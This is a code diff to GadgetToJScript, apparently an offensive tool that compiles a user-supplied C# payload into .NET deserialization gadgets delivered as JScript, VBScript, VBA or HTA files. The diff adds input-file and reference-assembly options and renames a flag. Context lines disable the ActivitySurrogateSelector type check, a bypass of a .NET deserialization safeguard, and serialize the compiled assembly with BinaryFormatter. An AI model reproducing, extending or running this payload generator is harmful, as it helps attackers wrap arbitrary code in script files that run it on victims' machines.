@@ -40,7 +40,8 @@ namespace GadgetToJScript{
             hex
         }
 
-
+        private static string _inputFName;
+        private static string _references;
         private static string _wsh;
         private static string _outputFName = "test";
         private static bool _regFree = false;
@@ -53,10 +54,12 @@ namespace GadgetToJScript{
 
 
             OptionSet options = new OptionSet(){
+                {"i|input=","Input file, example: C:\\Users\\userX\\Desktop\\payload.cs", v => _inputFName=v},
+                {"r|references=","Reference Assemblies, example: System.dll,System.IO.Compression.dll", v => _references=v},
                 {"w|scriptType=","js, vbs, vba or hta", v =>_wsh=v},
                 {"e|encodeType=","VBA gadgets encoding: b64 or hex (default set to b64)", v => _enc=v},
                 {"o|output=","Generated payload output file, example: C:\\Users\\userX\\Desktop\\output (Without extension)", v =>_outputFName=v},
-                {"r|regfree","registration-free activation of .NET based COM components", v => _regFree = v != null},
+                {"f|regfree","registration-free activation of .NET based COM components", v => _regFree = v != null},
                 {"h|help=","Show Help", v => show_help = v != null},
             };
 
@@ -64,7 +67,7 @@ namespace GadgetToJScript{
             {
                 options.Parse(args);
 
-                if (_wsh == "" || _outputFName == "")
+                if (_wsh == "" || _outputFName == "" || _inputFName == "")
                 {
                     showHelp(options);
                     return;
@@ -81,6 +84,7 @@ namespace GadgetToJScript{
                     showHelp(options);
                     return;
                 }
+
             }
             catch (Exception e)
             {
@@ -130,7 +134,7 @@ namespace GadgetToJScript{
             ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
 
 
-            Assembly testAssembly = TestAssemblyLoader.compile();
+            Assembly testAssembly = TestAssemblyLoader.compile(_inputFName, _references);
 
             BinaryFormatter _formatterStg2 = new BinaryFormatter();
             MemoryStream _msStg2 = new MemoryStream();
